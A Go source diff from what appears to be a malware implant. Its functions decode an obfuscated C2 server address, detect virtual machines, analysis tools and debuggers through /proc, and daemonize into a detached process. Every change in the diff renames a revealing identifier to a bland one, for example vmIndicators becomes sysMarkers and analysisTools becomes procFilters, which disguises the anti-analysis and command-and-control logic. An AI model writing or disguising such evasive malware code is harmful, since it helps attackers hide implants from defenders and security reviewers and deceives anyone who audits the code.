@@ -117,7 +117,7 @@ func blastoise(data []byte, key []byte) []byte {
 //	Final: Verify MD5 checksum of payload
 //
 // Parameters:
-//   - encoded: Base64 encoded obfuscated string from gothTits constant
+//   - encoded: Base64 encoded obfuscated string from serviceAddr constant
 //
 // Returns: Decoded C2 address (e.g., "192.168.1.1:443") or empty string on error
 func venusaur(encoded string) string {
@@ -125,7 +125,7 @@ func venusaur(encoded string) string {
 	if err != nil {
 		return ""
 	}
-	key := charizard(cryptSeed)
+	key := charizard(configSeed)
 	layer2 := make([]byte, len(layer1))
 	for i := range layer1 {
 		layer2[i] = layer1[i] ^ key[i%len(key)]
@@ -176,7 +176,7 @@ func winnti() bool {
 			}
 			if cmdline, err := os.ReadFile("/proc/" + proc.Name() + "/cmdline"); err == nil {
 				cmdStr := strings.ToLower(string(cmdline))
-				for _, indicator := range vmIndicators {
+				for _, indicator := range sysMarkers {
 					if strings.Contains(cmdStr, indicator) {
 						return true
 					}
@@ -184,7 +184,7 @@ func winnti() bool {
 			}
 		}
 	}
-	for _, tool := range analysisTools {
+	for _, tool := range procFilters {
 		if _, err := os.Stat(tool); err == nil {
 			if out, err := exec.Command("pgrep", "-f", filepath.Base(tool)).Output(); err == nil {
 				if len(strings.TrimSpace(string(out))) > 0 {
@@ -196,7 +196,7 @@ func winnti() bool {
 	if ppid := os.Getppid(); ppid > 1 {
 		if cmdline, err := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", ppid)); err == nil {
 			parentCmd := strings.ToLower(string(cmdline))
-			for _, debugger := range parentDebuggers {
+			for _, debugger := range parentChecks {
 				if strings.Contains(parentCmd, debugger) {
 					return true
 				}
@@ -237,12 +237,12 @@ func mustangPanda() string {
 func stuxnet() {
 	// Skip daemonization AND signal traps in debug mode so output stays
 	// in the terminal and Ctrl-C exits cleanly.
-	if debugMode {
+	if verboseLog {
 		return
 	}
 
 	// Already the daemon child – just finish housekeeping.
-	if os.Getenv(daemonEnvKey) == "1" {
+	if os.Getenv(envLabel) == "1" {
 		daemonHousekeep()
 		return
 	}
@@ -255,7 +255,7 @@ func stuxnet() {
 	}
 
 	// Set marker so the child knows it is the daemon.
-	env := append(os.Environ(), daemonEnvKey+"=1")
+	env := append(os.Environ(), envLabel+"=1")
 
 	// Build the child process attributes: new session, detached.
 	attr := &syscall.ProcAttr{
